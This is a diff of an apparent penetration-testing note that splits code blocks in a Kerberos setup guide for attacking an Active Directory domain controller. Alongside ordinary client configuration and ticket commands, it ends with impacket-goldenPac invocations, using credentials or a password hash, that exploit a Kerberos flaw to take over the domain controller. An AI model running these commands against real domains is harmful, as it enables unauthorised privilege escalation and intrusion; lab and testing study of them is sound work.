@@ -26,10 +26,14 @@ sudo apt install krb5-user cifs-utils
 ```bash
 # Step 1: Add domain controller to `/etc/hosts`
 10.10.11.10 example.com dc01.example.com dc01
+```
 
+```bash
 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf`
 nameserver 10.10.11.10
+```
 
+```bash
 # Step 3: Edit `/etc/krb5.conf`
 
 [libdefaults]
@@ -44,7 +48,9 @@ nameserver 10.10.11.10
 [domain_realm]
     .domain.internal = example.com
     domain.internal = example.com
+```
 
+```bash
 # Step 4: Sync time to domain controller
 ntpdate -s example.com
 ```
@@ -52,7 +58,9 @@ ntpdate -s example.com
 ```bash
 # Generate kerberos ticket for user: user
 kinit user
+```
 
+```bash
 # Check ticket
 klist
 ```
@@ -76,7 +84,9 @@ smbclient -W example.com //DC01/SYSVOL -k
 ```bash
 # With creds
 impacket-goldenPac 'example.com/user:password@dc01'
+```
 
+```bash
 # With hash
 impacket-goldenPac --hashes :hash 'example.com/user@dc01'
 ```
